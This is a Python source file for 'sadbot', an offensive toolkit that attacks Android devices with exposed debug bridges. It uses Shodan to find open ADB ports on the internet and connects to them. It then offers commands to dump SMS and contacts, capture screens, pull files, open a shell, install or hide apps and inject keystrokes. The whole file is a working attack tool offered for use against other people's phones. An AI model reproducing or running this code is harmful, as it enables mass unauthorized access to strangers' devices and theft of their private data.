#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
authors : @termuxhackers-id [iqbalmh18]
codename: sadbot - simple adbsploit toolkit
version : 1.0
github  : https://github.com/termuxhackers-id
social  : @termuxhackers.id
'''
# import modules
import os, sys, time
from rich.console import Console
from rich.table import Table
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.completion import WordCompleter
# colors
w="\033[00m"; r="\033[1;31m"; g = "\033[1;32m"; y = "\033[1;33m"; b = "\033[1;34m"; p = "\033[1;35m"; c = "\033[1;36m"; d = w+"\033[2;37m"; null="> /dev//null 2>&1"
# wordlist for auto completer
# main completer
main_completer = WordCompleter([
    '?',
    'help', 
    'banner', 
    'clear', 
    'exit', 
    'shodan init ', 
    'shodan search ', 
    'connect ', 
    'tcpip',
    'show apikey',
    'show devices',
    'exploit'
    ])
# exploit completer
exploit_completer = WordCompleter([
    '?',
    'help',
    'clear',
    'back',
    'app',
    'shell',
    'sysinfo',
    'meminfo',
    'macinfo',
    'screencap',
    'screenrec',
    'getsms',
    'getcontact',
    'usekey',
    "write",
    'pull',
    'push',
    'root',
    'reboot'
    ])
# keylist for adb
keylist = ('UNKNOWN','MENU','SOFT_RIGHT','HOME','BACK','ENDCALL','CALL','0','1','2','3','4','5','6','7','8','9','START','POUND','DPAD_UP','DPAD_DOWN','DPAD_LEFT','DPAD_RIGHT','DPAD_CENTER','VOLUME_UP','VOLUME_DOWN','POWER','CAMERA','CLEAR','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','COMMA','PERIOD','ALT_LEFT','ALT_RIGHT','SHIFT_LEFT','SHIFT_RIGHT','TAB','SPACE','SYM','EXPLORER','ENVELOPE','ENTER','DELETE','GRAVE','MINUS','EQUALS','LEFT_BRACKET','RIGHT_BRACKET','BACKSLASH','SEMICOLON','APOSTROPHE','SLASH','AT','NUM','HEADSETHOOK','FOKUS','PLUS','MENU','NOTIFICATION','SEARCH','TAG')
# input style prompt_toolkit
input = PromptSession()
style_main = Style.from_dict({
    '': 'white',
    'username': 'underline white',
    'pound': 'bold #ce0000',})
input_main = [
    ('class:username', 'sadbot'),
    ('class:pound', ' > ')]
style_exploit = Style.from_dict({
    '': 'white',
    'username': 'underline white',
    'pound': 'bold #ce0000',
    'colon1': 'white',
    'colon2': 'white',
    'mode': 'bold cyan'})
input_exploit = [
    ('class:username', 'sadbot'),
    ('class:colon1', '('),
    ('class:mode', 'connected'),
    ('class:colon2', ')'),
    ('class:pound',    ' > '),
]
# shodan apikey
shodan_key="data/shodan.key"
console = Console()

class MAIN:
    def __init__(self):
        self.devices=None; self.onlines=[]; self.offline=[]
        if os.path.isfile(shodan_key): self.apikey=open(shodan_key,"r").read()
        else: self.apikey=None
        os.system("adb start-server > /dev//null")

    def connect(self,ip):
        if len(ip.split(":")) == 2:
            os.system(f"adb connect {ip} > /dev//null")
            self.connected()
        else:
            if os.path.isfile(ip):
                for line in open(ip,"r").read().splitlines():
                    self.connect(line.strip())
    
    def connected(self):
        res=os.popen("adb devices | sed 's/device/online/g'","r").read().splitlines()
        for dev in res:
            z=dev.split()
            if len(z) == 2:
                if z[1] == "online":
                    if z[0] in self.onlines: continue
                    else: self.onlines.append(z[0])
                else:
                    if z[0] in self.offline: continue
                    else: self.offline.append(z[0])
            else: continue
    
    def disconnect(self,x=None):
        if x != None: os.system("adb disconnect "+x+" > /dev//null"); print("* success disconnecting: "+x)
        else: os.system("adb disconnect > /dev//null"); print("* success disconnecting all devices")

    def shodan_init(self, apikey):
        os.system("shodan init "+apikey+" > logs/shodan_init.log")
        if "Successfully" in open("logs/shodan_init.log","r").read():
            open(shodan_key,"a").write(apikey)
            self.apikey=apikey
            print("* success initialize shodan apikey: data/shodan.key")
            os.remove("logs/shodan_init.log")
        else:
            if os.path.isfile(shodan_key): os.remove(shodan_key)
            self.apikey=None


    def shodan_search(self,limit):
        if int(limit) < 101:
            tgl=time.strftime("%d%m%y")
            print("* trying to get vuln device from shodan ...")
            os.system("shodan download --limit "+limit+" adb android debug bridge device > /dev//null"); time.sleep(2)
            os.system("shodan parse --fields ip_str,port --separator : adb.json.gz > results/vuln_"+tgl+".log")
            print("* results saved as: results/vuln_"+tgl+".log")
        else: print("* oops limit out of range, please try again")

    def tcpip(self,ip,port):
        self.connected()
        if ip in self.onlines: os.system("adb -s "+ip+" tcpip "+port)
        else: print("* oops devices is not connected: "+ip)

    def help(self,num):
        if num == int(0):
            print(w)
            print(w+"<how to use>")
            print(w+" ---------- ")
            print(w+"   shodan init <apikey>      shodan api configuration")
            print(w+"   shodan search <limit>     search for vuln devices")
            print(w+"   show apikey               show shodan api")
            print(w+"   show devices              show available devices")
            print(w+"   connect <option>          connect to devices")
            print(w+"   exploit <option>          switch to exploit devices")
            print(w)
            print(w+"<basic cmd>")
            print(w+" ---------- ")
            print(w+"   help,?                    show this messages")
            print(w+"   banner                    show banner")
            print(w+"   clear                     clear screen")
            print(w+"   exit                      exit in program")
            print(w)
        elif num == int(1):
            print(w)
            print(w+"usage:")
            print(w+"   shodan init <apikey>")
            print(w+"   shodan search <limit>    max limit for search is 100")
            print(w+"example:")
            print(w+"   shodan init ThisIsMyShodanApikey")
            print(w+"   shodan search 25         then u will received 25 results")
            print(w)
            print(w+"   get shodan api from: https://shodan.io")
        elif num == int(2):
            print(w)
            print(w+"usage:")
            print(w+"   connect <option>")
            print(w+"option:")
            print(w+"   -s/--serial       connect with serial numbers")
            print(w+"   -f/--file         connect from file (serial:port)")
            print(w+"example:")
            print(w+"   connect -s 127.0.0.1:5555")
            print(w+"   connect -f /path/to/serial.list")
            print(w)
        elif num == int(3):
            print(w)
            print(w+"usage:")
            print(w+"   exploit <option> <serial>")
            print(w+"option:")
            print(w+"   -s/--serial       single exploit")
            print(w+"example:")
            print(w+"   exploit -s 127.0.0.1:5555")
            print(w)
        else: pass

    def start(self):
        os.system("clear")
        banner()
        while True:
            commands = input.prompt(input_main, auto_suggest=AutoSuggestFromHistory(), style=style_main, completer=main_completer)
            cmd = commands.split()
            if int(len(cmd)) == 1:
                if commands in ("?","help"): self.help(0)
                elif commands == "shodan": self.help(1)
                elif commands == "connect": self.help(2)
                elif commands == "exploit": self.help(3)
                elif commands in ("banner"): banner()
                elif commands in ("cls","clear"): os.system("clear")
                elif commands in ("exit","logout"): os.system("adb kill-server > /dev//null"); self.disconnect(); exit()
                else: pass
            elif int(len(cmd)) == 2:
                if cmd[0] == "show":
                    if cmd[1] == "apikey": print("* shodan apikey: "+str(self.apikey))
                    elif cmd[1] in ("device","devices"): os.system("adb devices | sed -e 's/List of devices attached/\--------------------------------/g;s/device/online/g;' | awk '!NF{$0="+'"--------------------------------"'+"}1'")
                    else: print("* oops no command found for: "+commands)
                else: print("* oops no command found for: "+commands)
            elif int(len(cmd)) == 3:
                if cmd[0] == "shodan" and cmd[1] == "init":
                    if int(len(cmd[2])) > 10: self.shodan_init(cmd[2])
                    else: self.help(1)
                elif cmd[0] == "shodan" and cmd[1] == "search":
                    if int(len(cmd[2])) < 101: self.shodan_search(cmd[2])
                    else: self.help(1)
                elif cmd[0] == "connect":
                    if cmd[1] in ("-s","--serial"): print("* connecting with devices: "+cmd[2]); self.connect(cmd[2])
                    elif cmd[1] in ("-f","--file"): print("* connecting with devices from file: "+cmd[2]); self.connect(cmd[2])
                    else: self.help(2)
                elif cmd[0] == "exploit":
                    if cmd[1] in ("-s","--serial"): exploit.start(cmd[2])
                    else: self.help(3)
                else: print("* oops no command found for: "+commands)
            else: pass

main=MAIN()

class EXPLOIT:
    def __init__(self):
        self.session=None

    def shell(self,serial):
        if self.session != None: os.system("adb -s "+serial+" shell")
        else: print("* oops device not responding, please reconnect devices")

    def sysinfo(self,serial):
        if self.session != None:
            try:
                x=os.popen("adb -s "+serial+" shell getprop | grep ro.product.manufacturer","r").read().strip()
                print("* device manufacturer: "+x.split(" ")[1].replace("[","").replace("]",""))
            except: pass
            try:
                x=os.popen("adb -s "+serial+" shell getprop | grep ro.build.version.release","r").read().strip()
                print("* device version     : android "+x.split(" ")[1].replace("[","").replace("]",""))
            except: pass
            try:
                x=os.popen("adb -s "+serial+" shell getprop | grep ro.product.model","r").read().strip()
                print("* device model       : "+x.split(" ")[1].replace("[","").replace("]",""))
            except: pass
            try:
                x=os.popen("adb -s "+serial+" shell getprop | grep persist.sys.timezone","r").read().strip()
                print("* device model       : "+x.split(" ")[1].replace("[","").replace("]",""))
            except: pass
        else: print("* oops device not responding, please reconnect devices")

    def meminfo(self,serial,apk=None):
        if apk != None: os.system("adb -s "+serial+" shell dumpsys meminfo "+apk)
        else: os.system("adb -s "+serial+" shell dumpsys meminfo")

    def macinfo(self,serial):
        try:
            macinfo=os.system("adb -s "+serial+" shell 'cat /sys/class/net/wlan0/address'")
            print("* mac address: "+macinfo)
        except: print("* failed to get mac address info")

    def screencap(self,serial):
        if self.session != None:
            x=os.popen("adb -s "+serial+" shell getprop | grep ro.product.manufacturer","r").read().strip()
            try: manufactur=x.split(" ")[1].replace("[","").replace("]","")
            except: manufactur="devices"
            output = manufactur+"_"+time.strftime('%d.%m.%Y')+".jpg"
            print("* trying to take screen capture ...")
            os.system("adb -s "+serial+" shell screencap -p /sdcard/"+output+";sleep 5")
            os.system("adb -s "+serial+" pull /sdcard/"+output+" results/ > /dev//null;adb -s "+serial+" shell rm /sdcard/"+output)
            if os.path.isfile("results/"+output): print("* screencap saved as: results/"+output)
            else: print("* oops failed to take screen capture")
        else: print("* oops device not responding, please reconnect devices")

    def screenrec(self,serial):
        if self.session != None:
            x=os.popen("adb -s "+serial+" shell getprop | grep ro.product.manufacturer","r").read().strip()
            try: manufactur=x.split(" ")[1].replace("[","").replace("]","")
            except: manufactur="devices"
            output = manufactur+"_"+time.strftime('%d.%m.%Y')+".mp4"
            print("* trying to take screen records ...")
            print("* press ctrl+c to stop recording")
            os.system("adb -s "+serial+" shell screenrecord /sdcard/"+output+";sleep 3")
            os.system("adb -s "+serial+" pull /sdcard/"+output+" results/ > /dev//null && adb -s "+serial+" shell rm /sdcard/"+output)
            if os.path.isfile("results/"+output): print("* screenrec saved as: results/"+output)
            else: print("* oops failed to take screen records")
        else: print("* oops device not responding, please reconnect devices")

    def download(self,serial,type,name):
        if self.session != None and type in ("-d","--dir"):
            print("* trying to download directory: "+name)
            os.system("adb -s "+serial+" pull "+name+" results/ > /dev//null 2>1")
            print("* directory saved as: results/"+name)
        elif self.session != None and type in ("-f","--file"):
            print("* trying to download file: "+name)
            os.system("adb -s "+serial+" pull "+name+" results/ > /dev//null 2>1")
            print("* file saved as: results/"+name)
        else: print("* oops device not responding, please reconnect devices")

    def upload(self,serial,type,name):
        if self.session != None and type in ("-d","--dir"):
            print("* trying to upload directory: "+name)
            os.system("adb -s "+serial+" push "+name+" /sdcard > /dev//null 2>1")
            print("* directory uploaded as: /sdcard/"+name)
        elif self.session != None and type in ("-f","--file"):
            print("* trying to upload file: "+name)
            os.system("adb -s "+serial+" push "+name+" /sdcard > /dev//null 2>1")
            print("* file uploaded as: /sdcard/"+name)
        else: print("* oops device not responding, please reconnect devices")

    def app(self,serial,method,apk=None):
        if self.session != None and method == "install" and os.path.isfile(apk):
            try: appname = os.popen('''aapt dump badging '''+apk+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").readline().strip()
            except: appname = "unknown"
            os.system("adb -s "+serial+" install "+apk+" > /dev/null")
            if appname in os.popen("adb -s "+serial+" shell pm list package","r").read(): print("* success installing apk: "+apk)
            else: print("* failed to install apk: "+apk)
        elif self.session != None and method == "uninstall" and apk !=None:
            apk = "package: "+apk
            os.system("adb -s "+serial+" uninstall "+apk+" > /dev/null")
            if apk in os.popen("adb -s "+serial+" shell pm list package","r").read(): print("* success uninstalling apk: "+apk)
            else: print("* failed to uninstall apk: "+apk)
        elif self.session != None and method == "run" and apk !=None:
            try:
                activity = os.popen("adb -s "+serial+" shell 'cmd package resolve-activity --brief "+apk+" | tail -n 1'").readline().strip()
                os.system("adb -s "+serial+" shell am start -n "+activity+" > /dev//null")
                print("* apps running: "+activity)
            except: print("* failed to run apps, please try again later")
        elif self.session != None and method == "getpath" and apk !=None:
            path = os.popen("adb -s "+serial+" shell pm path "+apk).readline().strip()
            print("* path found: "+path)
        elif self.session != None and method == "getlist" and apk == None:
            os.system("adb -s "+serial+" shell pm list package | sed 's/package://g'")
        elif self.session != None and method == "hide" and apk != None:
            os.system("adb -s "+serial+" shell pm hide "+apk+" > /dev//null")
            print("* hide apps successfully: "+apk)
        elif self.session != None and method == "unhide" and apk != None:
            os.system("adb -s "+serial+" shell pm unhide "+apk+" > /dev//null")
            print("* unhide apps successfully: "+apk)
        else: print("* oops device not responding, please reconnect devices")

    def key(self,serial,no):
        no=int(no)
        if self.session != None:
            print("* execute remote code for keyevent: ["+keylist[no]+"]")
            os.system("adb -s "+serial+" shell input keyevent "+str(no)+" > /dev//null")
        else: print("* oops device not responding, please reconnect devices")

    def input_text(self,serial,text):
        if self.session != None:
            os.system("adb -s "+serial+" shell input text '"+text+"' > /dev//null")
            print("* writting text: "+text)
        else: print("* oops device not responding, please reconnect devices")


    def check_root(self,serial):
        if self.session != None:
            root = os.popen("adb -s "+serial+" root").read()
            if "adb is already running as root" in root: print("* devices already running as: root")
            else: print("* devices is not running as: root")
        else: print("* oops device not responding, please reconnect devices")

    def reboot(self,serial,mode):
        if self.session != None:
            if mode in ("-r","--recovery"):
                os.system("adb -s "+serial+" shell reboot recovery > /dev//null")
                print("* devices have been reboot into recovery mode")
            elif mode ("-b","--bootloader"):
                os.system("adb -s "+serial+" shell reboot bootloader > /dev//null")
                print("* devices have been reboot into bootloader mode")
            else: print("* failed to reboot device, please select reboot mode")
        else: print("* oops device not responding, please reconnect devices")

    def getcontact(self,serial):
        table = Table(show_header=True, header_style="red")
        table.add_column("No", justify="left", width=5)
        table.add_column("Name", justify="left", width=20)
        table.add_column("Number", justify="center", width=20)
        app=os.popen("adb -s "+serial+" shell pm list package | sed 's/package://g'","r").read()
        if "com.android.contacts" in app or "com.android.contact" in app:
            os.system("adb -s "+serial+" shell content query --uri content://contacts/phones/ --projection display_name:number > logs/getcontact.log")
            if os.path.isfile("logs/getcontact.log"):
                if "No result found." in open("logs/getcontact.log","r").readline().strip():
                    print("* oops no contact found on this devices")
                else:
                    os.system("cat logs/getcontact.log | grep Row > logs/getcontact-row.log;sed -i -e 's/ //g;s/Row://g;s/display_name=/,/g;s/number=//g;s/*//g;s/#//g;s/+//g;s/-//g;s/.$//g' logs/getcontact-row.log")
                    for lines in open("logs/getcontact-row.log","r").read().splitlines():
                        lines=lines.split(",")
                        if len(lines) == 3:
                            table.add_row(
                                lines[0],lines[1],lines[2]
                                )
                        else: continue
                    console.print(table)
                    os.system("rm -rf logs/getcontact* > /dev//null")
            else: print("* failed to get contact from this devices")
        else: print("* oops no contact found on this devices")
    
    def getsms(self,serial):
        app=os.popen("adb -s "+serial+" shell pm list package | sed 's/package://g'","r").read()
        if "com.android.mms" in app:
            os.system("adb -s "+serial+" shell content query --uri content://sms/ --projection address:date:body")
        else: print("* oops no sms found on this devices")

    def help(self,num):
        if num == int(0):
            print(w)
            print(w+"<list exploit>")
            print(w+" ------------ ")
            print(w+"   app                  app manager")
            print(w+"   shell                switch to command shell")
            print(w+"   sysinfo              system information")
            print(w+"   meminfo              memory information")
            print(w+"   macinnfo             mac address information")
            print(w+"   screencap            screenshot device")
            print(w+"   screenrec            screenrecord device")
            print(w+"   getsms               get sms from device")
            print(w+"   getcontact           get contact from device")
            print(w+"   usekey               remote device with key")
            print(w+"   write                writing text")
            print(w+"   pull                 download file/directory")
            print(w+"   push                 upload file/directory")
            print(w+"   root                 run device as root")
            print(w+"   reboot               reboot manager")
            print(w)
            print(w+"<basic cmd>")
            print(w+" ------------ ")
            print(w+"   ?/help               show this messages")
            print(w+"   clear                clear screen")
            print(w+"   exit                 exit from listener")
            print(w)
        elif num == int(1):
            print(w)
            print(w+"<usage>")
            print(w+"   app <option> <foo>")
            print(w+"<option>")
            print(w+"   -i/--install     install apk from computer")
            print(w+"   -u/--uninstall   uninstall apk with packagename")
            print(w+"   -r/--run         run app with main activity")
            print(w+"   -p/--path        get path to apk file ")
            print(w+"   --hide           hide application")
            print(w+"   --unhide         unhide application")
            print(w+"<example>")
            print(w+"   app --install /sdcard/foo.apk")
            print(w+"   app -u com.packagename.example")
            print(w+"   app -r com.packagename.example")
            print(w)
        elif num == int(2):
            print(w)
            print(w+"<usage>")
            print(w+"   usekey <option> <foo>")
            print(w+"<option>")
            print(w+"   -l/--list      show key code list")
            print(w+"   -e/--exec      exec key code")
            print(w+"<example>")
            print(w+"   usekey --list")
            print(w+"   usekey -e 18")
            print(w)
        elif num == int(3):
            print(w)
            print(w+"<usage>")
            print(w+"   pull <option> <foo>")
            print(w+"<option>")
            print(w+"   -f/--file        download file from device")
            print(w+"   -d/--dir         download directory from device")
            print(w+"<example>")
            print(w+"   pull -f /sdcard/foo.jpg")
            print(w+"   pull --dir /sdcard/documents ")
            print(w)
        elif num == int(4):
            print(w)
            print(w+"<usage>")
            print(w+"   push <option> <foo>")
            print(w+"<option>")
            print(w+"   -f/--file        upload file")
            print(w+"   -d/--dir         upload directory")
            print(w+"<example>")
            print(w+"   push -f /sdcard/foo.jpg")
            print(w+"   push -d /sdcard/documents/")
            print(w)
        elif num == int(5):
            print(w)
            print(w+"<usage>")
            print(w+"   reboot <option>")
            print(w+"<option>")
            print(w+"   -r/--recovery      reboot to recovery")
            print(w+"   -b/--bootloader    reboot to bootloader")
            print(w+"<example>")
            print(w+"   reboot --recovery")
            print(w+"   reboot --bootloader")
            print(w)
        elif num == int(6):
            print(w)
            print(w+"<usage>")
            print(w+"   write <text>")
            print(w+"<example>")
            print(w+"   write HelloWorld!")
            print(w)
        else: pass
    
    def start(self, serial):
        main.connect(serial)
        main.connected()
        while True:
            if serial in os.popen("adb devices | sed -e 's/device/online/g'","r").read():
                self.session=serial
                commands = input.prompt(input_exploit, auto_suggest=AutoSuggestFromHistory(), style=style_exploit, completer=exploit_completer)
                cmd = commands.split()
                if int(len(cmd)) == 1:
                    if commands in ("?","help"): self.help(0)
                    elif commands == "app": self.help(1)
                    elif commands == "usekey": self.help(2)
                    elif commands == "pull": self.help(3)
                    elif commands == "push": self.help(4)
                    elif commands == "reboot": self.help(5)
                    elif commands == "write": self.help(6)
                    elif commands == "clear": os.system("clear")
                    elif commands == "exit": break
                    elif commands == "shell": print("* trying to swicth into shell interface: "+serial+"\n"); self.shell(serial)
                    elif commands == "sysinfo": self.sysinfo(serial)
                    elif commands == "meminfo": self.meminfo(serial)
                    elif commands == "macinfo": self.macinfo(serial)
                    elif commands == "screencap": self.screencap(serial)
                    elif commands == "screenrec": self.screenrec(serial)
                    elif commands == "root": self.check_root(serial)
                    elif commands == "getsms": self.getsms(serial)
                    elif commands == "getcontact": self.getcontact(serial)
                    else: print("* oops no commands found for: "+commands)
                elif int(len(cmd)) == 2:
                    if cmd[0] == "app" and cmd[1] in ("-l","--list"): self.app(serial,"getlist",apk=None)
                    elif cmd[0] == "usekey" and cmd[1] in ("-l","--list"):
                        i = -1
                        print(w+"-"*32)
                        for i in range(0,86):
                            print(w+str(i)+r+")"+w+" remote code for: "+keylist[i])
                        print(w+"-"*32)
                    elif cmd[0] == "write" and len(cmd[1]) > 0:
                        self.input_text(serial,str(cmd[1]))
                    elif cmd[0] == "reboot" and cmd[1] in ("-r","--recovery","-b","--bootloader"): self.reboot(serial,cmd[1])
                    else: print("* oops no commands found for: "+commands)
                elif int(len(cmd)) == 3:
                    if cmd[0] == "app":
                        if cmd[1] in ("-r","--run") and cmd[2] != "": self.app(serial, "run", cmd[2])
                        elif cmd[1] == "--hide" and cmd[2] != "": self.app(serial, "hide", cmd[2])
                        elif cmd[1] == "--unhide" and cmd[2] != "": self.app(serial, "unhide", cmd[2])
                        elif cmd[1] in ("-i","--install") and cmd[2] != "": self.app(serial, "install", cmd[2])
                        elif cmd[1] in ("-u","--uninstall") and cmd[2] != "": self.app(serial, "uninstall", cmd[2])
                        elif cmd[1] in ("-p","--path") and cmd[2] != "": self.app(serial, "getpath", cmd[2])
                        else: print("* oops no commands found for: "+commands)
                    elif cmd[0] == "pull":
                        if cmd[1] in ("-f","--file","-d","--dir"): self.download(serial, cmd[1], cmd[2])
                        else: print("* oops no commands found for: "+commands)
                    elif cmd[0] == "push":
                        if cmd[1] in ("-f","--file","-d","--dir"): self.upload(serial, cmd[1], cmd[2])
                        else: print("* oops no commands found for: "+commands)
                    elif cmd[0] == "usekey":
                        if cmd[1] in ("-e","--exec") and cmd[2] != "": self.key(serial,cmd[2])
                        elif cmd[1] in ("-w","--write") and cmd[2] != "": self.input_text(serial, cmd[2])
                        else: print("* oops no commands found for: "+commands)
                    else: print("* oops no commands found for: "+commands)
                else: pass
            else: self.start(serial)
            
exploit = EXPLOIT()

def banner():
    os.system("cat data/banner")
    print(w)
    print(y+"**SadBot**"+w+" is a simple exploit tool for android debug bridge")
    print(w+"type "+y+"help"+w+" or "+y+"?"+w+" for show available commands.")
    print(w)
